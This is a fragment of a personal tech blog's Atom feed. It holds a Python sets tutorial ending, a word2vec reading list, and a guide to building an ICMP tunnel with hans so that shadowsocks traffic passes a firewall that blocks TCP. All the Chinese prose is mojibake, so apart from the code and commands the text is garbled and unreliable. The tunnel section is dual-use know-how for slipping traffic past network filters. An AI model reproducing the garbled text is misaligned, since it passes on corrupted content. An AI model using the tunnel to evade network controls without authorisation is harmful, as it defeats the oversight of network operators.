æ³¨æ„ï¼šæ‰€æœ‰çš„æ›´æ–°æ–¹æ³•åŒæ—¶é€‚ç”¨äºå…¶ä»–å¯è¿­ä»£å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œæ¯”å¦‚åˆ—è¡¨ï¼Œå…ƒç»„</span></span><br><span class="line"><span class="comment"># setA.update([1, 2, 3, 4, 5, 6])</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="fu-zhi">å¤åˆ¶</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set_org = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªæ˜¯å¼•ç”¨çš„å¤åˆ¶ï¼Œéœ€è¦æ³¨æ„</span></span><br><span class="line">set_copy = set_org</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å¤åˆ¶é›†åˆä¹Ÿä¼šå½±å“åŸæ¥çš„é›†åˆ</span></span><br><span class="line">set_copy.update([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="built_in">print</span>(set_copy)</span><br><span class="line"><span class="built_in">print</span>(set_org)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ copy() çœŸæ­£å¤åˆ¶é›†åˆ</span></span><br><span class="line">set_org = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">set_copy = set_org.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ä¿®æ”¹å¤åˆ¶é›†åˆä¸ä¼šå½±å“åŸæ¥çš„é›†åˆ</span></span><br><span class="line">set_copy.update([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="built_in">print</span>(set_copy)</span><br><span class="line"><span class="built_in">print</span>(set_org)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="zi-ji-chao-ji-he-bu-jiao-ji">å­é›†ï¼Œè¶…é›†å’Œä¸äº¤é›†</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">setB = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># issubset(setX): å¦‚æœ setX åŒ…å«é›†åˆï¼Œè¿”å› True</span></span><br><span class="line"><span class="built_in">print</span>(setA.issubset(setB))</span><br><span class="line"><span class="built_in">print</span>(setB.issubset(setA)) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># issuperset(setX): å¦‚æœé›†åˆåŒ…å« setXï¼Œè¿”å› True</span></span><br><span class="line"><span class="built_in">print</span>(setA.issuperset(setB)) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(setB.issuperset(setA))</span><br><span class="line"></span><br><span class="line"><span class="comment"># isdisjoint(setX) : å¦‚æœä¸¤ä¸ªé›†åˆäº¤é›†ä¸ºç©ºï¼Œæ¯”å¦‚æ²¡æœ‰ç›¸åŒçš„å…ƒç´ ï¼Œè¿”å› True</span></span><br><span class="line">setC = &#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(setA.isdisjoint(setB))</span><br><span class="line"><span class="built_in">print</span>(setA.isdisjoint(setC))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h3><span id="frozenset">Frozenset</span></h3><p>Frozenset åªæ˜¯æ™®é€šé›†å’Œçš„ä¸å˜ç‰ˆæœ¬ã€‚ å°½ç®¡å¯ä»¥éšæ—¶ä¿®æ”¹é›†åˆçš„å…ƒç´ ï¼Œä½† Frozenset çš„å…ƒç´ åœ¨åˆ›å»ºåä¿æŒä¸å˜ã€‚ åˆ›å»ºæ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_frozenset = <span class="built_in">frozenset</span>(iterable)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">frozenset</span>([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥ä¸‹æ“ä½œä¸å…è®¸ï¼š</span></span><br><span class="line"><span class="comment"># a.add(5)</span></span><br><span class="line"><span class="comment"># a.remove(1)</span></span><br><span class="line"><span class="comment"># a.discard(1)</span></span><br><span class="line"><span class="comment"># a.clear()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ—¶ï¼Œæ›´æ–°æ–¹æ³•ä¹Ÿä¸å…è®¸ï¼š</span></span><br><span class="line"><span class="comment"># a.update([1,2,3])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¶ä»–é›†åˆæ“ä½œå¯è¡Œ</span></span><br><span class="line">odds = <span class="built_in">frozenset</span>(&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;)</span><br><span class="line">evens = <span class="built_in">frozenset</span>(&#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(odds.union(evens))</span><br><span class="line"><span class="built_in">print</span>(odds.intersection(evens))</span><br><span class="line"><span class="built_in">print</span>(odds.difference(evens))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">frozenset</span>(&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;)</span><br><span class="line"><span class="built_in">frozenset</span>()</span><br><span class="line"><span class="built_in">frozenset</span>(&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      04. é›†åˆ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ Mac OS X ä¸Šä½¿ç”¨ hans é…ç½® ICMP éš§é“</title>
    <link href="https://qiwihui.com/qiwihui-blog-52/"/>
    <id>https://qiwihui.com/qiwihui-blog-52/</id>
    <published>2022-08-13T01:54:25.490Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å› ä¸ºç”µä¿¡ç™½åå•ï¼Œé«˜ç«¯å£åŸºæœ¬æ— æ³•ä½¿ç”¨ï¼Œè§£å†³åŠæ³•å°±æ˜¯å°†ç¿»å¢™æœåŠ¡å¯åŠ¨åœ¨80ï¼Œ443ç­‰å¯è®¿é—®ç«¯å£ã€‚ä½†æ˜¯æœ€è¿‘é˜²ç«å¢™åˆä¸€æ¬¡å‡çº§ï¼Œå›½å¤–çš„æœåŠ¡å™¨åŸºæœ¬åªèƒ½ ping é€šï¼ŒTCP è¯·æ±‚æ— æ³•å®Œæˆï¼Œèƒ½è®¿é—®ä¸–ç•Œçš„æ–¹å¼è¶Šæ¥è¶Šå›°éš¾ã€‚æœ¬æ–‡ä»‹ç»ä¸€ç§æ–¹æ³•ï¼Œå°†æ•°æ®åŒ…å°è£…åœ¨ ping åŒ…ä¸­è¿›è¡Œä¼ è¾“ã€‚æœ¬æ–¹æ³•ä¸­ä½¿ç”¨ <a href="http://code.gerade.org/hans/">hans</a> è¿™ä¸ªé¡¹ç›®ç»“åˆ shadowsocks-libev ç¿»å¢™ã€‚</p><span id="more"></span><h2><span id="an-zhuang">å®‰è£…</span></h2><h3><span id="fu-wu-qi-duan">æœåŠ¡å™¨ç«¯</span></h3><p>åŒæ ·ï¼Œéœ€è¦åœ¨æœåŠ¡å™¨ç«¯ç¼–è¯‘å®‰è£… <code>hans</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -c https://github.com/friedrich/hans/archive/v1.0.tar.gz</span><br><span class="line">tar zxvf v1.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> hans-1.0/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåä¼šäº§ç”Ÿ <code>hans</code> æ‰§è¡Œç¨‹åºï¼ŒæŒ‰ä»¥ä¸‹å‘½ä»¤ä»¥ <code>root</code> å¯åŠ¨ï¼Œç¨‹åºä¼šè¿›å…¥ Deamon æ¨¡å¼ã€‚å¦‚æœè¦çœ‹åˆ°è¾“å‡ºï¼Œå¯ä»¥åŠ ä¸Š <code>-f</code> å‚æ•°ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hans -s 10.1.2.0 -p password</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>password</code> ä¸ºè®¾ç½®çš„å¯†ç ã€‚ç„¶åä½¿ç”¨ <code>netstat -rn</code> å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ª <code>tun0</code> è®¾å¤‡</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -rn</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">(çœç•¥å…¶ä»–çš„)</span><br><span class="line">10.1.2.0        0.0.0.0         255.255.255.0   U         0 0          0 tun0</span><br></pre></td></tr></table></figure><h3><span id="ke-hu-duan">å®¢æˆ·ç«¯</span></h3><p>åœ¨ Mac OS X ä¸Šï¼Œå…ˆå®‰è£… <code>tuntap</code> å†…æ ¸æ‰©å±•æ¥å…è®¸åˆ›å»ºè™šæ‹Ÿç½‘å¡ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ Homebrew-Cask å®‰è£…ï¼Œå®‰è£…è¿‡ç¨‹ä¸­éœ€è¦æŒ‰ç…§æŒ‡ç¤ºç»™ç¨‹åºæƒé™ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew cask install tuntap</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ Mac ç‰ˆæœ¬ç¨‹åºå¹¶è§£å‹ï¼š<a href="https://sourceforge.net/projects/hanstunnel/files/osx/">hans</a></p><p>è¿è¡Œç¨‹åºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./hans -c &lt;server-ip&gt; -p password -d tun0</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>server-ip</code> æ˜¯ä½ æœåŠ¡å™¨çš„ IPï¼Œ<code>-d</code> æŒ‡å®šMacä¸Šæ–°å¯è®¾å¤‡çš„åç§°ã€‚Mac ä¸Šåœæ­¢ <code>hans</code> ç¨‹åºè¯·ä½¿ç”¨ <code>kill -9</code>ã€‚å¦‚æœå¯åŠ¨æ­£å¸¸ï¼Œè¿™æ—¶åœ¨Macä¸Šä¹ŸåŒæ ·å¯ä»¥è§‚å¯Ÿåˆ°tun0è®¾å¤‡ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ifconfig</span><br><span class="line"></span><br><span class="line">(çœç•¥å…¶ä»–)</span><br><span class="line">tun0: flags=8851&lt;UP,POINTOPOINT,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1467</span><br><span class="line">        inet 10.1.2.100 --&gt; 10.1.2.1 netmask 0xffffffff </span><br><span class="line">        open (pid 74236)</span><br></pre></td></tr></table></figure><p>ç†è®ºä¸Šè¿™æ—¶æœåŠ¡å™¨ IP æ˜¯æ— æ³• ping é€šäº†ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ping &lt;server-ip&gt;</span><br><span class="line">PING &lt;server-ip&gt;: 56 data bytes</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 0</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 1</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 2</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 3</span><br><span class="line">^C</span><br><span class="line">--- &lt;server-ip&gt; ping statistics ---</span><br><span class="line">5 packets transmitted, 0 packets received, 100.0% packet loss</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå°±å»ºç«‹äº†ä¸€æ¡ä»æœ¬åœ°åˆ°æœåŠ¡å™¨çš„ hanstunnel tunnel äº†ã€‚</p><p>ç°åœ¨åªéœ€è¦å°†æœ¬åœ° <code>ss-local</code> çš„é…ç½®ä¸­çš„ <code>server</code> å‚æ•°æ”¹ä¸º <code>tun0</code> çš„ gateway åœ°å€ï¼ˆæœ¬ä¾‹ä¸º<code>10.1.2.1</code>ï¼‰å³å¯ï¼Œå…¶ä»–ä¸éœ€è¦åšä»»ä½•ä¿®æ”¹ã€‚</p><h3><span id="jian-cha-liu-liang">æ£€æŸ¥æµé‡</span></h3><p>åœ¨æœåŠ¡å™¨ç½‘å¡ä¸ŠæŠ“åŒ…å¯ä»¥ä¸æ–­çœ‹åˆ° ICMP çš„ ï½€echo requestï½€ å’Œ ï½€echo replyï½€ åŒ…ï¼Œåœ¨ <code>tun0</code> ä¸Šå¯ä»¥çœ‹åˆ°å®é™…çš„æ•°æ®åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tcpdump -ni ens3</span><br><span class="line"></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens3, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">02:16:29.146644 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 93</span><br><span class="line">02:16:29.146647 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 13</span><br><span class="line">02:16:29.146652 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 13</span><br><span class="line">02:16:29.146684 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 93</span><br><span class="line">02:16:29.146704 IP &lt;server-ip&gt; &gt; &lt;local-ip&gt;: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 257</span><br><span class="line">02:16:29.146858 IP &lt;server-ip&gt; &gt; &lt;local-ip&gt;: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 833</span><br><span class="line">02:16:29.146942 IP &lt;server-ip&gt; &gt; &lt;local-ip&gt;: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 257</span><br><span class="line"></span><br><span class="line">(ç•¥å»ä¸€å †)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±æ˜¯ä½¿ç”¨ TCP over ICMP çš„æ–¹æ³•è¿›è¡Œæ•°æ®ä¼ è¾“çš„é…ç½®è¿‡ç¨‹ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      åœ¨ Mac OS X ä¸Šä½¿ç”¨ hans é…ç½® ICMP éš§é“
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>word2vecç†è§£æ€è·¯</title>
    <link href="https://qiwihui.com/qiwihui-blog-66/"/>
    <id>https://qiwihui.com/qiwihui-blog-66/</id>
    <published>2022-08-13T01:54:25.480Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å½’çº³æ•´ç†äº†ä¸€äº›è®ºæ–‡å’Œåšå®¢å¯¹word2vecçš„ç†è§£ï¼Œä»¥æœŸç†è§£word2vecã€‚</p><h2><span id="gai-shu">æ¦‚è¿°</span></h2><h3><span id="yu-yan-biao-shi-ci-xiang-liang">è¯­è¨€è¡¨ç¤ºï¼šè¯å‘é‡</span></h3><ol><li><p>è¯çš„ç‹¬çƒ­è¡¨ç¤ºï¼ˆOne-Hot Representationï¼‰</p><p>ç¼ºç‚¹ï¼š</p><ul><li>å®¹æ˜“å—ç»´æ•°ç¾éš¾çš„å›°æ‰°ï¼›</li><li>ä¸èƒ½å¾ˆå¥½åœ°åˆ»ç”»è¯ä¸è¯ä¹‹é—´çš„ç›¸ä¼¼æ€§ï¼Œä»»æ„ä¸¤ä¸ªè¯ä¹‹é—´éƒ½æ˜¯å­¤ç«‹çš„ï¼›</li></ul></li><li><p>è¯çš„åˆ†å¸ƒå¼è¡¨ç¤ºï¼ˆDistributed Representationï¼‰</p><ol><li>åŸºäºçŸ©é˜µçš„åˆ†å¸ƒè¡¨ç¤ºï¼šæ¯”å¦‚ï¼ŒGloVeæ¨¡å‹ï¼›</li><li>åŸºäºèšç±»çš„åˆ†å¸ƒè¡¨ç¤ºï¼›</li><li>åŸºäºç¥ç»ç½‘ç»œçš„åˆ†å¸ƒè¡¨ç¤ºï¼Œè¯åµŒå…¥ï¼›</li></ol></li></ol><span id="more"></span><h3><span id="yu-yan-mo-xing">è¯­è¨€æ¨¡å‹</span></h3><p>æ–‡æ³•è¯­è¨€æ¨¡å‹ï¼Œç»Ÿè®¡è¯­è¨€æ¨¡å‹</p><p>æ ¸å¿ƒæ˜¯ä¸Šä¸‹æ–‡çš„è¡¨ç¤ºä»¥åŠä¸Šä¸‹æ–‡ä¸ç›®æ ‡è¯ä¹‹é—´çš„å…³ç³»çš„å»ºæ¨¡ã€‚</p><p>è¯­è¨€æ¨¡å‹å°±æ˜¯è®¡ç®—ä¸€ä¸ªå¥å­çš„æ¦‚ç‡å¤§å°çš„æ¨¡å‹ã€‚ä¸€ä¸ªå¥å­çš„æ‰“åˆ†æ¦‚ç‡è¶Šé«˜ï¼Œè¶Šè¯´æ˜ä»–æ˜¯æ›´åˆä¹äººè¯´å‡ºæ¥çš„è‡ªç„¶å¥å­ã€‚å¸¸è§çš„ç»Ÿè®¡è¯­è¨€æ¨¡å‹æœ‰Nå…ƒæ–‡æ³•æ¨¡å‹ï¼ˆN-gram Modelï¼‰ï¼Œæœ€å¸¸è§çš„æ˜¯unigram modelã€bigram modelã€trigram modelç­‰ç­‰ã€‚è¿˜æœ‰N-posæ¨¡å‹ã€‚</p><h3><span id="ci-qian-ru">è¯åµŒå…¥</span></h3><p>2001å¹´ï¼ŒBengio ç­‰äººæ­£å¼æå‡ºç¥ç»ç½‘ç»œè¯­è¨€æ¨¡å‹ï¼ˆ Neural Network Language Model ï¼ŒNNLMï¼‰ï¼Œè¯¥æ¨¡å‹åœ¨å­¦ä¹ è¯­è¨€æ¨¡å‹çš„åŒæ—¶ï¼Œä¹Ÿå¾—åˆ°äº†è¯å‘é‡ã€‚æ‰€ä»¥è¯·æ³¨æ„ï¼š<strong>è¯å‘é‡å¯ä»¥è®¤ä¸ºæ˜¯ç¥ç»ç½‘ç»œè®­ç»ƒè¯­è¨€æ¨¡å‹çš„å‰¯äº§å“</strong>ã€‚</p><p>åšæ³•ï¼š</p><p>1ã€å°†one-hotä¸­çš„vectoræ¯ä¸€ä¸ªå…ƒç´ ç”±æ•´å½¢æ”¹ä¸ºæµ®ç‚¹å‹ï¼Œå˜ä¸ºæ•´ä¸ªå®æ•°èŒƒå›´çš„è¡¨ç¤ºï¼›2ã€å°†åŸæ¥ç¨€ç–çš„å·¨å¤§ç»´åº¦å‹ç¼© <strong>åµŒå…¥</strong> åˆ°ä¸€ä¸ªæ›´å°ç»´åº¦çš„ç©ºé—´ã€‚</p><h3><span id="shen-jing-wang-luo-yu-yan-mo-xing-yu-word2vec">ç¥ç»ç½‘ç»œè¯­è¨€æ¨¡å‹ä¸word2vec</span></h3><h4><span id="shen-jing-wang-luo-yu-yan-mo-xing">ç¥ç»ç½‘ç»œè¯­è¨€æ¨¡å‹ï¼š</span></h4><p>a. Neural Network Language Model ï¼ŒNNLMb. Log-Bilinear Language Modelï¼Œ LBLc. Recurrent Neural Network based Language Modelï¼ŒRNNLMd. Collobert å’Œ Weston åœ¨2008 å¹´æå‡ºçš„ C&amp;W æ¨¡å‹e. Mikolov ç­‰äººæå‡ºäº† CBOWï¼ˆ Continuous Bagof-Wordsï¼Œè¿ç»­è¯è¢‹æ¨¡å‹ï¼‰å’Œ Skip-gram æ¨¡å‹</p><p>CBOWå’ŒSkip-gramï¼š</p><ul><li>å¦‚æœæ˜¯ç”¨ä¸€ä¸ªè¯è¯­ä½œä¸ºè¾“å…¥ï¼Œæ¥é¢„æµ‹å®ƒå‘¨å›´çš„ä¸Šä¸‹æ–‡ï¼Œé‚£è¿™ä¸ªæ¨¡å‹å«åšâ€œSkip-gram æ¨¡å‹â€ï¼›</li><li>è€Œå¦‚æœæ˜¯æ‹¿ä¸€ä¸ªè¯è¯­çš„ä¸Šä¸‹æ–‡ä½œä¸ºè¾“å…¥ï¼Œæ¥é¢„æµ‹è¿™ä¸ªè¯è¯­æœ¬èº«ï¼Œåˆ™æ˜¯ â€œCBOW æ¨¡å‹â€ã€‚</li></ul><h4><span id="word2vec">word2vec</span></h4><p>å®ç°CBOWå’ŒSkip-gramè¯­è¨€æ¨¡å‹çš„å·¥å…·ï¼ˆæ­£å¦‚C&amp;Wæ¨¡å‹çš„å®ç°å·¥å…·æ˜¯SENNAï¼‰ã€‚</p><h3><span id="cbow-he-skip-gram">CBOWå’ŒSkip-gram</span></h3><ol><li>åŸç†</li><li>åŠ é€Ÿè®­ç»ƒæŠ€å·§ï¼š<ul><li>Negative Sample</li><li>Hierarchical Softmax</li></ul></li></ol><h2><span id="ying-yong">åº”ç”¨</span></h2><p>æ–‡æœ¬åˆ†ç±»ï¼Œä¸ªæ€§åŒ–æ¨èï¼Œå¹¿å‘Šç‚¹å‡»ç­‰</p><h2><span id="lun-wen-he-wen-zhang">è®ºæ–‡å’Œæ–‡ç« </span></h2><ol><li>Mikolov ä¸¤ç¯‡åŸè®ºæ–‡ï¼š<ul><li>Distributed Representations of Sentences and Documents</li><li>Efficient estimation of word representations in vector space</li></ul></li><li>Yoav Goldberg çš„è®ºæ–‡ï¼šword2vec Explained- Deriving Mikolov et al.â€™s Negative-Sampling Word-Embedding Method</li><li>Xin Rong çš„è®ºæ–‡ï¼šword2vec Parameter Learning Explained</li><li>æ¥æ–¯æƒŸçš„åšå£«è®ºæ–‡ï¼šã€ŠåŸºäºç¥ç»ç½‘ç»œçš„è¯å’Œæ–‡æ¡£è¯­ä¹‰å‘é‡è¡¨ç¤ºæ–¹æ³•ç ”ç©¶ã€‹ä»¥åŠ<a href="http://licstar.NET">åšå®¢</a></li><li><a href="https://www.zhihu.com/question/53011711">word2vec ç›¸æ¯”ä¹‹å‰çš„ Word Embedding æ–¹æ³•å¥½åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Ÿ</a></li><li>Sebastian çš„åšå®¢ï¼šã€On word embeddings - Part 2: Approximating the Softmaxã€</li><li>ã€ŠHow to Generate a Good Word Embedding?ã€‹,Siwei Lai, Kang Liu, Liheng Xu, Jun Zhao</li><li>ã€Šé¢å‘è‡ªç„¶è¯­è¨€å¤„ç†çš„åˆ†å¸ƒå¼è¡¨ç¤ºå­¦ä¹ ã€‹ï¼Œé‚±é”¡é¹</li><li>ã€ŠDeep Learning å®æˆ˜ä¹‹ word2vecã€‹</li><li>ä¸€äº›åšæ–‡ï¼š<ul><li><a href="http://www.cnblogs.com/iloveai/p/word2vec.html">http://www.cnblogs.com/iloveai/p/word2vec.html</a></li><li><a href="http://www.hankcs.com/nlp/word2vec.html">http://www.hankcs.com/nlp/word2vec.html</a></li><li><a href="http://licstar.NET/archives/328">http://licstar.NET/archives/328</a></li><li><a href="https://zhuanlan.zhihu.com/p/22477976">https://zhuanlan.zhihu.com/p/22477976</a></li><li><a href="http://blog.csdn.Net/itplus/article/details/37969519">http://blog.csdn.Net/itplus/article/details/37969519</a></li><li><a href="http://www.tuicool.com/articles/fmuyamf">http://www.tuicool.com/articles/fmuyamf</a></li><li><a href="http://licstar.net/archives/620#comment-1542">http://licstar.net/archives/620#comment-1542</a></li><li><a href="http://blog.csdn.net/ycheng_sjtu/article/details/48520293">http://blog.csdn.net/ycheng_sjtu/article/details/48520293</a></li></ul></li></ol><h2><span id="ben-wen-can-kao">æœ¬æ–‡å‚è€ƒ</span></h2><ul><li><a href="https://zhuanlan.zhihu.com/p/32590428">word embeddingä¸word2vec: å…¥é—¨è¯åµŒå…¥å‰çš„å¼€èƒƒèœ</a></li><li><a href="https://zhuanlan.zhihu.com/p/26306795">ç§’æ‡‚è¯å‘é‡Word2vecçš„æœ¬è´¨</a></li><li><a href="https://zhuanlan.zhihu.com/p/29076736">åŸºäº word2vec å’Œ CNN çš„æ–‡æœ¬åˆ†ç±» ï¼šç»¼è¿° &amp; å®è·µ</a></li><li><a href="https://x-algo.cn/index.php/2016/03/12/281/">word2vecåœ¨å·¥ä¸šç•Œçš„åº”ç”¨åœºæ™¯</a></li><li><a href="https://www.zhihu.com/question/25269336/answer/49188284">word2vecæœ‰ä»€ä¹ˆåº”ç”¨ï¼Ÿ - orangeprinceçš„å›ç­” - çŸ¥ä¹</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      word2vecç†è§£æ€è·¯
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="æ·±åº¦å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬2å¤©ï¼šçŸ©é˜µå·¥ä½œæµ</title>
    <link href="https://qiwihui.com/qiwihui-blog-85/"/>
    <id>https://qiwihui.com/qiwihui-blog-85/</id>
    <published>2022-08-13T01:54:25.450Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
